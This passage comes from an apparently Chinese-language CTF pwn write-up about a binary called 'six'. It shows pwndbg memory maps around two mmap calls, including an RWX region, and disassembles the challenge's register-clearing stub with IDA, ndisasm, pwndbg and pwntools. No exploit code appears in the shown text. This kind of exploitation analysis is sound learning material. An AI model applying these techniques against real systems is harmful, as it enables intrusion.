class="number">0x7ffff7ffc000</span>     <span class="number">0x7ffff7ffd000</span> r--p     <span class="number">1000</span> <span class="number">25000</span>  /lib/x86_64-linux-gnu/ld-<span class="number">2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7ffd000</span>     <span class="number">0x7ffff7ffe000</span> rw-p     <span class="number">1000</span> <span class="number">26000</span>  /lib/x86_64-linux-gnu/ld-<span class="number">2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7ffe000</span>     <span class="number">0x7ffff7fff000</span> rw-p     <span class="number">1000</span> <span class="number">0</span>      </span><br><span class="line">    <span class="number">0x7ffffffde000</span>     <span class="number">0x7ffffffff000</span> rw-p    <span class="number">21000</span> <span class="number">0</span>      [stack]</span><br><span class="line"><span class="number">0xffffffffff600000</span> <span class="number">0xffffffffff601000</span> r-xp     <span class="number">1000</span> <span class="number">0</span>      [vsyscall]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">2</span>、第二次调试</span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ <span class="built_in">rsp</span>  <span class="number">0x7fffffffdcc0</span> ◂— <span class="number">0x300000001</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│      <span class="number">0x7fffffffdcc8</span> ◂— <span class="number">0xeccb72e069a9</span> 第二块</span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│      <span class="number">0x7fffffffdcd0</span> ◂— <span class="number">0xd1c2fd207617</span> 第一块</span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│      <span class="number">0x7fffffffdcd8</span> ◂— <span class="number">0x4193ac317ff71a00</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│ <span class="built_in">rbp</span>  <span class="number">0x7fffffffdce0</span> —▸ <span class="number">0x7fffffffdd20</span> —▸ <span class="number">0x555555554cc0</span> ◂— <span class="keyword">push</span>   <span class="built_in">r15</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│      <span class="number">0x7fffffffdce8</span> —▸ <span class="number">0x555555554be8</span> ◂— <span class="keyword">mov</span>    <span class="built_in">rax</span>, <span class="built_in">qword</span> <span class="built_in">ptr</span> [<span class="built_in">rip</span> + <span class="number">0x2014a1</span>]</span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│      <span class="number">0x7fffffffdcf0</span> —▸ <span class="number">0x7fffffffdd1e</span> ◂— <span class="number">0x555555554cc00000</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│      <span class="number">0x7fffffffdcf8</span> ◂— <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">第一块分配前</span><br><span class="line"> ► <span class="number">0x555555554aa8</span>    <span class="keyword">call</span>   mmap@plt &lt;<span class="number">0x555555554840</span>&gt;</span><br><span class="line"><span class="symbol">        addr:</span> <span class="number">0xd1c2fd207000</span></span><br><span class="line"><span class="symbol">        len:</span> <span class="number">0x1000</span></span><br><span class="line"><span class="symbol">        prot:</span> <span class="number">0x7</span></span><br><span class="line"><span class="symbol">        flags:</span> <span class="number">0x22</span></span><br><span class="line"><span class="symbol">        fd:</span> <span class="number">0xffffffff</span></span><br><span class="line"><span class="symbol">        offset:</span> <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line">pwndbg&gt; vmmap</span><br><span class="line"><span class="symbol">LEGEND:</span> STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">    <span class="number">0x555555554000</span>     <span class="number">0x555555555000</span> r-xp     <span class="number">1000</span> <span class="number">0</span>      /home/buffer/Desktop/six/six</span><br><span class="line">    <span class="number">0x555555755000</span>     <span class="number">0x555555756000</span> r--p     <span class="number">1000</span> <span class="number">1000</span>   /home/buffer/Desktop/six/six</span><br><span class="line">    <span class="number">0x555555756000</span>     <span class="number">0x555555757000</span> rw-p     <span class="number">1000</span> <span class="number">2000</span>   /home/buffer/Desktop/six/six</span><br><span class="line">    <span class="number">0x7ffff7a0d000</span>     <span class="number">0x7ffff7bcd000</span> r-xp   1c0000 <span class="number">0</span>      /lib/x86_64-linux-gnu/libc-<span class="number">2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7bcd000</span>     <span class="number">0x7ffff7dcd000</span> ---p   <span class="number">200000</span> 1c0000 /lib/x86_64-linux-gnu/libc-<span class="number">2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7dcd000</span>     <span class="number">0x7ffff7dd1000</span> r--p     <span class="number">4000</span> 1c0000 /lib/x86_64-linux-gnu/libc-<span class="number">2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7dd1000</span>     <span class="number">0x7ffff7dd3000</span> rw-p     <span class="number">2000</span> 1c4000 /lib/x86_64-linux-gnu/libc-<span class="number">2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7dd3000</span>     <span class="number">0x7ffff7dd7000</span> rw-p     <span class="number">4000</span> <span class="number">0</span>      </span><br><span class="line">    <span class="number">0x7ffff7dd7000</span>     <span class="number">0x7ffff7dfd000</span> r-xp    <span class="number">26000</span> <span class="number">0</span>      /lib/x86_64-linux-gnu/ld-<span class="number">2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7fd3000</span>     <span class="number">0x7ffff7fd6000</span> rw-p     <span class="number">3000</span> <span class="number">0</span>      </span><br><span class="line">    <span class="number">0x7ffff7ff7000</span>     <span class="number">0x7ffff7ffa000</span> r--p     <span class="number">3000</span> <span class="number">0</span>      [vvar]</span><br><span class="line">    <span class="number">0x7ffff7ffa000</span>     <span class="number">0x7ffff7ffc000</span> r-xp     <span class="number">2000</span> <span class="number">0</span>      [vdso]</span><br><span class="line">    <span class="number">0x7ffff7ffc000</span>     <span class="number">0x7ffff7ffd000</span> r--p     <span class="number">1000</span> <span class="number">25000</span>  /lib/x86_64-linux-gnu/ld-<span class="number">2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7ffd000</span>     <span class="number">0x7ffff7ffe000</span> rw-p     <span class="number">1000</span> <span class="number">26000</span>  /lib/x86_64-linux-gnu/ld-<span class="number">2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7ffe000</span>     <span class="number">0x7ffff7fff000</span> rw-p     <span class="number">1000</span> <span class="number">0</span>      </span><br><span class="line">    <span class="number">0x7ffffffde000</span>     <span class="number">0x7ffffffff000</span> rw-p    <span class="number">21000</span> <span class="number">0</span>      [stack]</span><br><span class="line"><span class="number">0xffffffffff600000</span> <span class="number">0xffffffffff601000</span> r-xp     <span class="number">1000</span> <span class="number">0</span>      [vsyscall]</span><br><span class="line"></span><br><span class="line">第一块分配后</span><br><span class="line">pwndbg&gt; vmmap</span><br><span class="line"><span class="symbol">LEGEND:</span> STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">    <span class="number">0x555555554000</span>     <span class="number">0x555555555000</span> r-xp     <span class="number">1000</span> <span class="number">0</span>      /home/buffer/Desktop/six/six</span><br><span class="line">    <span class="number">0x555555755000</span>     <span class="number">0x555555756000</span> r--p     <span class="number">1000</span> <span class="number">1000</span>   /home/buffer/Desktop/six/six</span><br><span class="line">    <span class="number">0x555555756000</span>     <span class="number">0x555555757000</span> rw-p     <span class="number">1000</span> <span class="number">2000</span>   /home/buffer/Desktop/six/six</span><br><span class="line">    <span class="number">0x7ffff7a0d000</span>     <span class="number">0x7ffff7bcd000</span> r-xp   1c0000 <span class="number">0</span>      /lib/x86_64-linux-gnu/libc-<span class="number">2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7bcd000</span>     <span class="number">0x7ffff7dcd000</span> ---p   <span class="number">200000</span> 1c0000 /lib/x86_64-linux-gnu/libc-<span class="number">2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7dcd000</span>     <span class="number">0x7ffff7dd1000</span> r--p     <span class="number">4000</span> 1c0000 /lib/x86_64-linux-gnu/libc-<span class="number">2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7dd1000</span>     <span class="number">0x7ffff7dd3000</span> rw-p     <span class="number">2000</span> 1c4000 /lib/x86_64-linux-gnu/libc-<span class="number">2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7dd3000</span>     <span class="number">0x7ffff7dd7000</span> rw-p     <span class="number">4000</span> <span class="number">0</span>      </span><br><span class="line">    <span class="number">0x7ffff7dd7000</span>     <span class="number">0x7ffff7dfd000</span> r-xp    <span class="number">26000</span> <span class="number">0</span>      /lib/x86_64-linux-gnu/ld-<span class="number">2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7fd3000</span>     <span class="number">0x7ffff7fd6000</span> rw-p     <span class="number">3000</span> <span class="number">0</span>      </span><br><span class="line">    <span class="number">0x7ffff7ff6000</span>     <span class="number">0x7ffff7ff7000</span> rwxp     <span class="number">1000</span> <span class="number">0</span>      第一块</span><br><span class="line">    <span class="number">0x7ffff7ff7000</span>     <span class="number">0x7ffff7ffa000</span> r--p     <span class="number">3000</span> <span class="number">0</span>      [vvar]</span><br><span class="line">    <span class="number">0x7ffff7ffa000</span>     <span class="number">0x7ffff7ffc000</span> r-xp     <span class="number">2000</span> <span class="number">0</span>      [vdso]</span><br><span class="line">    <span class="number">0x7ffff7ffc000</span>     <span class="number">0x7ffff7ffd000</span> r--p     <span class="number">1000</span> <span class="number">25000</span>  /lib/x86_64-linux-gnu/ld-<span class="number">2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7ffd000</span>     <span class="number">0x7ffff7ffe000</span> rw-p     <span class="number">1000</span> <span class="number">26000</span>  /lib/x86_64-linux-gnu/ld-<span class="number">2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7ffe000</span>     <span class="number">0x7ffff7fff000</span> rw-p     <span class="number">1000</span> <span class="number">0</span>      </span><br><span class="line">    <span class="number">0x7ffffffde000</span>     <span class="number">0x7ffffffff000</span> rw-p    <span class="number">21000</span> <span class="number">0</span>      [stack]</span><br><span class="line"><span class="number">0xffffffffff600000</span> <span class="number">0xffffffffff601000</span> r-xp     <span class="number">1000</span> <span class="number">0</span>      [vsyscall]</span><br><span class="line"></span><br><span class="line">第二块分配前</span><br><span class="line"> ► <span class="number">0x555555554adc</span>    <span class="keyword">call</span>   mmap@plt &lt;<span class="number">0x555555554840</span>&gt;</span><br><span class="line"><span class="symbol">        addr:</span> <span class="number">0xeccb72e06000</span></span><br><span class="line"><span class="symbol">        len:</span> <span class="number">0x1000</span></span><br><span class="line"><span class="symbol">        prot:</span> <span class="number">0x3</span></span><br><span class="line"><span class="symbol">        flags:</span> <span class="number">0x22</span></span><br><span class="line"><span class="symbol">        fd:</span> <span class="number">0xffffffff</span></span><br><span class="line"><span class="symbol">        offset:</span> <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line">第二块分配后</span><br><span class="line">pwndbg&gt; vmmap</span><br><span class="line"><span class="symbol">LEGEND:</span> STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">    <span class="number">0x555555554000</span>     <span class="number">0x555555555000</span> r-xp     <span class="number">1000</span> <span class="number">0</span>      /home/buffer/Desktop/six/six</span><br><span class="line">    <span class="number">0x555555755000</span>     <span class="number">0x555555756000</span> r--p     <span class="number">1000</span> <span class="number">1000</span>   /home/buffer/Desktop/six/six</span><br><span class="line">    <span class="number">0x555555756000</span>     <span class="number">0x555555757000</span> rw-p     <span class="number">1000</span> <span class="number">2000</span>   /home/buffer/Desktop/six/six</span><br><span class="line">    <span class="number">0x7ffff7a0d000</span>     <span class="number">0x7ffff7bcd000</span> r-xp   1c0000 <span class="number">0</span>      /lib/x86_64-linux-gnu/libc-<span class="number">2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7bcd000</span>     <span class="number">0x7ffff7dcd000</span> ---p   <span class="number">200000</span> 1c0000 /lib/x86_64-linux-gnu/libc-<span class="number">2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7dcd000</span>     <span class="number">0x7ffff7dd1000</span> r--p     <span class="number">4000</span> 1c0000 /lib/x86_64-linux-gnu/libc-<span class="number">2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7dd1000</span>     <span class="number">0x7ffff7dd3000</span> rw-p     <span class="number">2000</span> 1c4000 /lib/x86_64-linux-gnu/libc-<span class="number">2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7dd3000</span>     <span class="number">0x7ffff7dd7000</span> rw-p     <span class="number">4000</span> <span class="number">0</span>      </span><br><span class="line">    <span class="number">0x7ffff7dd7000</span>     <span class="number">0x7ffff7dfd000</span> r-xp    <span class="number">26000</span> <span class="number">0</span>      /lib/x86_64-linux-gnu/ld-<span class="number">2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7fd3000</span>     <span class="number">0x7ffff7fd6000</span> rw-p     <span class="number">3000</span> <span class="number">0</span>      </span><br><span class="line">    <span class="number">0x7ffff7ff5000</span>     <span class="number">0x7ffff7ff6000</span> rw-p     <span class="number">1000</span> <span class="number">0</span>      第二块</span><br><span class="line">    <span class="number">0x7ffff7ff6000</span>     <span class="number">0x7ffff7ff7000</span> rwxp     <span class="number">1000</span> <span class="number">0</span>      第一块</span><br><span class="line">    <span class="number">0x7ffff7ff7000</span>     <span class="number">0x7ffff7ffa000</span> r--p     <span class="number">3000</span> <span class="number">0</span>      [vvar]</span><br><span class="line">    <span class="number">0x7ffff7ffa000</span>     <span class="number">0x7ffff7ffc000</span> r-xp     <span class="number">2000</span> <span class="number">0</span>      [vdso]</span><br><span class="line">    <span class="number">0x7ffff7ffc000</span>     <span class="number">0x7ffff7ffd000</span> r--p     <span class="number">1000</span> <span class="number">25000</span>  /lib/x86_64-linux-gnu/ld-<span class="number">2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7ffd000</span>     <span class="number">0x7ffff7ffe000</span> rw-p     <span class="number">1000</span> <span class="number">26000</span>  /lib/x86_64-linux-gnu/ld-<span class="number">2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7ffe000</span>     <span class="number">0x7ffff7fff000</span> rw-p     <span class="number">1000</span> <span class="number">0</span>      </span><br><span class="line">    <span class="number">0x7ffffffde000</span>     <span class="number">0x7ffffffff000</span> rw-p    <span class="number">21000</span> <span class="number">0</span>      [stack]</span><br><span class="line"><span class="number">0xffffffffff600000</span> <span class="number">0xffffffffff601000</span> r-xp     <span class="number">1000</span> <span class="number">0</span>      [vsyscall]</span><br></pre></td></tr></table></figure><p>我们看看，src处的数据到底是什么。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">.data:0000000000202020 src             db 48h ; H                 ; DATA XREF: main+71↑o</span><br><span class="line">.data:0000000000202020                                         ; main+87↑o ...</span><br><span class="line">.data:0000000000202021                 db  89h</span><br><span class="line">.data:0000000000202022                 db 0FCh</span><br><span class="line">.data:0000000000202023                 db  48h ; H</span><br><span class="line">.data:0000000000202024                 db  31h ; 1</span><br><span class="line">.data:0000000000202025                 db 0EDh</span><br><span class="line">.data:0000000000202026                 db  48h ; H</span><br><span class="line">.data:0000000000202027                 db  31h ; 1</span><br><span class="line">.data:0000000000202028                 db 0C0h</span><br><span class="line">.data:0000000000202029                 db  48h ; H</span><br><span class="line">.data:000000000020202A                 db  31h ; 1</span><br><span class="line">.data:000000000020202B                 db 0DBh</span><br><span class="line">.data:000000000020202C                 db  48h ; H</span><br><span class="line">.data:000000000020202D                 db  31h ; 1</span><br><span class="line">.data:000000000020202E                 db 0C9h</span><br><span class="line">.data:000000000020202F                 db  48h ; H</span><br><span class="line">.data:0000000000202030                 db  31h ; 1</span><br><span class="line">.data:0000000000202031                 db 0D2h</span><br><span class="line">.data:0000000000202032                 db  48h ; H</span><br><span class="line">.data:0000000000202033                 db  31h ; 1</span><br><span class="line">.data:0000000000202034                 db 0FFh</span><br><span class="line">.data:0000000000202035                 db  48h ; H</span><br><span class="line">.data:0000000000202036                 db  31h ; 1</span><br><span class="line">.data:0000000000202037                 db 0F6h</span><br><span class="line">.data:0000000000202038                 db  4Dh ; M</span><br><span class="line">.data:0000000000202039                 db  31h ; 1</span><br><span class="line">.data:000000000020203A                 db 0C0h</span><br><span class="line">.data:000000000020203B                 db  4Dh ; M</span><br><span class="line">.data:000000000020203C                 db  31h ; 1</span><br><span class="line">.data:000000000020203D                 db 0C9h</span><br><span class="line">.data:000000000020203E                 db  4Dh ; M</span><br><span class="line">.data:000000000020203F                 db  31h ; 1</span><br><span class="line">.data:0000000000202040                 db 0D2h</span><br><span class="line">.data:0000000000202041                 db  4Dh ; M</span><br><span class="line">.data:0000000000202042                 db  31h ; 1</span><br><span class="line">.data:0000000000202043                 db 0DBh</span><br><span class="line">.data:0000000000202044                 db  4Dh ; M</span><br><span class="line">.data:0000000000202045                 db  31h ; 1</span><br><span class="line">.data:0000000000202046                 db 0E4h</span><br><span class="line">.data:0000000000202047                 db  4Dh ; M</span><br><span class="line">.data:0000000000202048                 db  31h ; 1</span><br><span class="line">.data:0000000000202049                 db 0EDh</span><br><span class="line">.data:000000000020204A                 db  4Dh ; M</span><br><span class="line">.data:000000000020204B                 db  31h ; 1</span><br><span class="line">.data:000000000020204C                 db 0F6h</span><br><span class="line">.data:000000000020204D                 db  4Dh ; M</span><br><span class="line">.data:000000000020204E                 db  31h ; 1</span><br><span class="line">.data:000000000020204F                 db 0FFh</span><br><span class="line">.data:0000000000202050                 db    0</span><br><span class="line">.data:0000000000202051                 db    0</span><br></pre></td></tr></table></figure><p>这里四种方法(我知道的)可以将一串16进制机器码转换为汇编代码：</p><blockquote><p>1、直接使用IDA进行转换，工具条或者快捷键<br>2、使用nasm的ndisasm进行反汇编，ndisasm.exe -b 64 文件名，文件为包含机器码的bin文件<br>3、使用Pwndbg的disasm命令，disasm -c amd64 ‘str’,str为机器码16进制字符串<br>4、使用pwntools的disasm()，print disasm(‘str’.decode(‘hex’),arch = ‘amd64’),str同样为机器码16进制字符串</p></blockquote><p>既然src的数据可以执行，我们将这串机器码反汇编，然后得到如下代码：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、IDA转换</span><br><span class="line"><span class="symbol">.data:</span><span class="number">0000000000202021</span> <span class="number">48</span> <span class="number">89</span> FC      <span class="keyword">mov</span>     <span class="built_in">rsp</span>, <span class="built_in">rdi</span></span><br><span class="line"><span class="symbol">.data:</span><span class="number">0000000000202023</span> <span class="number">48</span> <span class="number">31</span> ED      <span class="keyword">xor</span>     <span class="built_in">rbp</span>, <span class="built_in">rbp</span></span><br><span class="line"><span class="symbol">.data:</span><span class="number">0000000000202026</span> <span class="number">48</span> <span class="number">31</span> C0      <span class="keyword">xor</span>     <span class="built_in">rax</span>, <span class="built_in">rax</span></span><br><span class="line"><span class="symbol">.data:</span><span class="number">0000000000202029</span> <span class="number">48</span> <span class="number">31</span> <span class="built_in">DB</span>      <span class="keyword">xor</span>     <span class="built_in">rbx</span>, <span class="built_in">rbx</span></span><br><span class="line"><span class="symbol">.data:</span>000000000020202C <span class="number">48</span> <span class="number">31</span> C9      <span class="keyword">xor</span>     <span class="built_in">rcx</span>, <span class="built_in">rcx</span></span><br><span class="line"><span class="symbol">.data:</span>000000000020202F <span class="number">48</span> <span class="number">31</span> D2      <span class="keyword">xor</span>     <span class="built_in">rdx</span>, <span class="built_in">rdx</span></span><br><span class="line"><span class="symbol">.data:</span><span class="number">0000000000202032</span> <span class="number">48</span> <span class="number">31</span> FF      <span class="keyword">xor</span>     <span class="built_in">rdi</span>, <span class="built_in">rdi</span></span><br><span class="line"><span class="symbol">.data:</span><span class="number">0000000000202035</span> <span class="number">48</span> <span class="number">31</span> F6      <span class="keyword">xor</span>     <span class="built_in">rsi</span>, <span class="built_in">rsi</span></span><br><span class="line"><span class="symbol">.data:</span><span class="number">0000000000202038</span> <span class="number">4D</span> <span class="number">31</span> C0      <span class="keyword">xor</span>     <span class="built_in">r8</span>, <span class="built_in">r8</span></span><br><span class="line"><span class="symbol">.data:</span>000000000020203B <span class="number">4D</span> <span class="number">31</span> C9      <span class="keyword">xor</span>     <span class="built_in">r9</span>, <span class="built_in">r9</span></span><br><span class="line"><span class="symbol">.data:</span>000000000020203E <span class="number">4D</span> <span class="number">31</span> D2      <span class="keyword">xor</span>     <span class="built_in">r10</span>, <span class="built_in">r10</span></span><br><span class="line"><span class="symbol">.data:</span><span class="number">0000000000202041</span> <span class="number">4D</span> <span class="number">31</span> <span class="built_in">DB</span>      <span class="keyword">xor</span>     <span class="built_in">r11</span>, <span class="built_in">r11</span></span><br><span class="line"><span class="symbol">.data:</span><span class="number">0000000000202044</span> <span class="number">4D</span> <span class="number">31</span> E4      <span class="keyword">xor</span>     <span class="built_in">r12</span>, <span class="built_in">r12</span></span><br><span class="line"><span class="symbol">.data:</span><span class="number">0000000000202047</span> <span class="number">4D</span> <span class="number">31</span> ED      <span class="keyword">xor</span>     <span class="built_in">r13</span>, <span class="built_in">r13</span></span><br><span class="line"><span class="symbol">.data:</span>000000000020204A <span class="number">4D</span> <span class="number">31</span> F6      <span class="keyword">xor</span>     <span class="built_in">r14</span>, <span class="built_in">r14</span></span><br><span class="line"><span class="symbol">.data:</span><span class="number">000000000020204D</span> <span class="number">4D</span> <span class="number">31</span> FF      <span class="keyword">xor</span>     <span class="built_in">r15</span>, <span class="built_in">r15</span></span><br><span class="line"></span><br><span class="line"><span class="number">2</span>、ndisasm转换</span><br><span class="line">λ ndisasm.exe -b <span class="number">64</span> lblb.bin</span><br><span class="line"><span class="number">00000000</span>  4889FC            <span class="keyword">mov</span> <span class="built_in">rsp</span>,<span class="built_in">rdi</span></span><br><span class="line"><span class="number">00000003</span>  4831ED            <span class="keyword">xor</span> <span class="built_in">rbp</span>,<span class="built_in">rbp</span></span><br><span class="line"><span class="number">00000006</span>  4831C0            <span class="keyword">xor</span> <span class="built_in">rax</span>,<span class="built_in">rax</span></span><br><span class="line"><span class="number">00000009</span>  4831<span class="built_in">DB</span>            <span class="keyword">xor</span> <span class="built_in">rbx</span>,<span class="built_in">rbx</span></span><br><span class="line">0000000C  4831C9            <span class="keyword">xor</span> <span class="built_in">rcx</span>,<span class="built_in">rcx</span></span><br><span class="line">0000000F  4831D2            <span class="keyword">xor</span> <span class="built_in">rdx</span>,<span class="built_in">rdx</span></span><br><span class="line"><span class="number">00000012</span>  4831FF            <span class="keyword">xor</span> <span class="built_in">rdi</span>,<span class="built_in">rdi</span></span><br><span class="line"><span class="number">00000015</span>  4831F6            <span class="keyword">xor</span> <span class="built_in">rsi</span>,<span class="built_in">rsi</span></span><br><span class="line"><span class="number">00000018</span>  4D31C0            <span class="keyword">xor</span> <span class="built_in">r8</span>,<span class="built_in">r8</span></span><br><span class="line"><span class="number">0000001B</span>  4D31C9            <span class="keyword">xor</span> <span class="built_in">r9</span>,<span class="built_in">r9</span></span><br><span class="line">0000001E  4D31D2            <span class="keyword">xor</span> <span class="built_in">r10</span>,<span class="built_in">r10</span></span><br><span class="line"><span class="number">00000021</span>  4D31DB            <span class="keyword">xor</span> <span class="built_in">r11</span>,<span class="built_in">r11</span></span><br><span class="line"><span class="number">00000024</span>  4D31E4            <span class="keyword">xor</span> <span class="built_in">r12</span>,<span class="built_in">r12</span></span><br><span class="line"><span class="number">00000027</span>  4D31ED            <span class="keyword">xor</span> <span class="built_in">r13</span>,<span class="built_in">r13</span></span><br><span class="line">0000002A  4D31F6            <span class="keyword">xor</span> <span class="built_in">r14</span>,<span class="built_in">r14</span></span><br><span class="line"><span class="number">0000002D</span>  4D31FF            <span class="keyword">xor</span> <span class="built_in">r15</span>,<span class="built_in">r15</span></span><br><span class="line"></span><br><span class="line"><span class="number">3</span>、pwndbg的disasm转换</span><br><span class="line">pwndbg&gt; disasm -c amd64 <span class="string">'4889FC4831ED4831C04831DB4831C94831D24831FF4831F64D31C04D31C94D31D24D31DB4D31E44D31ED4D31F64D31FF'</span>   </span><br><span class="line">   <span class="number">0</span>:    <span class="number">48</span> <span class="number">89</span> fc                 <span class="keyword">mov</span>    <span class="built_in">rsp</span>, <span class="built_in">rdi</span></span><br><span class="line">   <span class="number">3</span>:    <span class="number">48</span> <span class="number">31</span> ed                 <span class="keyword">xor</span>    <span class="built_in">rbp</span>, <span class="built_in">rbp</span></span><br><span class="line">   <span class="number">6</span>:    <span class="number">48</span> <span class="number">31</span> c0                 <span class="keyword">xor</span>    <span class="built_in">rax</span>, <span class="built_in">rax</span></span><br><span class="line">   <span class="number">9</span>:    <span class="number">48</span> <span class="number">31</span> <span class="built_in">db</span>                 <span class="keyword">xor</span>    <span class="built_in">rbx</span>, <span class="built_in">rbx</span></span><br><span class="line"><span class="symbol">   c:</span>    <span class="number">48</span> <span class="number">31</span> c9                 <span class="keyword">xor</span>    <span class="built_in">rcx</span>, <span class="built_in">rcx</span></span><br><span class="line"><span class="symbol">   f:</span>    <span class="number">48</span> <span class="number">31</span> d2                 <span class="keyword">xor</span>    <span class="built_in">rdx</span>, <span class="built_in">rdx</span></span><br><span class="line">  <span class="number">12</span>:    <span class="number">48</span> <span class="number">31</span> ff                 <span class="keyword">xor</span>    <span class="built_in">rdi</span>, <span class="built_in">rdi</span></span><br><span class="line">  <span class="number">15</span>:    <span class="number">48</span> <span class="number">31</span> f6                 <span class="keyword">xor</span>    <span class="built_in">rsi</span>, <span class="built_in">rsi</span></span><br><span class="line">  <span class="number">18</span>:    <span class="number">4d</span> <span class="number">31</span> c0                 <span class="keyword">xor</span>    <span class="built_in">r8</span>, <span class="built_in">r8</span></span><br><span class="line">  <span class="number">1b</span>:    <span class="number">4d</span> <span class="number">31</span> c9                 <span class="keyword">xor</span>    <span class="built_in">r9</span>, <span class="built_in">r9</span></span><br><span class="line">  1e:    <span class="number">4d</span> <span class="number">31</span> d2                 <span class="keyword">xor</span>    <span class="built_in">r10</span>, <span class="built_in">r10</span></span><br><span class="line">  <span class="number">21</span>:    <span class="number">4d</span> <span class="number">31</span> <span class="built_in">db</span>                 <span class="keyword">xor</span>    <span class="built_in">r11</span>, <span class="built_in">r11</span></span><br><span class="line">  <span class="number">24</span>:    <span class="number">4d</span> <span class="number">31</span> e4                 <span class="keyword">xor</span>    <span class="built_in">r12</span>, <span class="built_in">r12</span></span><br><span class="line">  <span class="number">27</span>:    <span class="number">4d</span> <span class="number">31</span> ed                 <span class="keyword">xor</span>    <span class="built_in">r13</span>, <span class="built_in">r13</span></span><br><span class="line">  2a:    <span class="number">4d</span> <span class="number">31</span> f6                 <span class="keyword">xor</span>    <span class="built_in">r14</span>, <span class="built_in">r14</span></span><br><span class="line">  <span class="number">2d</span>:    <span class="number">4d</span> <span class="number">31</span> ff                 <span class="keyword">xor</span>    <span class="built_in">r15</span>, <span class="built_in">r15</span></span><br><span class="line"></span><br><span class="line"><span class="number">4</span>、pwntools的disasm()转换</span><br><span class="line">&gt;&gt;&gt; print disasm(<span class="string">'4889FC4831ED4831C04831DB4831C94831D24831FF4831F64D31C04D31C94D31D24D31DB4D31E44D31ED4D31F64D31FF'</span>.decode(<span class="string">'hex'</span>),arch = <span class="string">'amd64'</span>)</span><br><span 